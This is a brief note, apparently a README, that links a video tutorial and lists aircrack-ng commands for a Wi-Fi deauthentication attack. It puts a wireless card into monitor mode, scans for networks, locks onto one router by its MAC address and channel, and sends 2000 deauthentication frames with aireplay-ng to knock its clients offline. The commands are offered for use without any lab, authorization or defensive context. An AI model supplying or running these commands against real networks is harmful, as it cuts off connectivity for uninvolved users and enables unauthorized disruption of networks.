Tutorial https://www.youtube.com/watch?v=RdVIlMABYVc

```
airmon-ng start wlan0
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel 6 wlan0mon
aireplay-ng --deauth 2000 -a xx:xx:xx:xx:xx:xx wlan0mon
```

xx:xx:xx:xx:xx:xx is MAC address of the router
